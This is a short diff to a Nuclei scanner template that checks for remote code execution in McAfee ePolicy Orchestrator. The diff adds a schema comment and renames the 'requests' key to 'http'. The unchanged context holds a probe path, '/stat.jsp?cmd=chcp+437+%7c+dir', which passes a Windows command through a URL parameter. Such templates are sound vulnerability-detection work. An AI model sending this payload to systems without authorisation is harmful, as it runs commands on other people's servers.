@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: mcafee-epo-rce
 
 info:
@@ -15,7 +16,7 @@ info:
     - https://swarm.ptsecurity.com/vulnerabilities-in-mcafee-epolicy-orchestrator/
   tags: mcafee,rce
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/stat.jsp?cmd=chcp+437+%7c+dir"
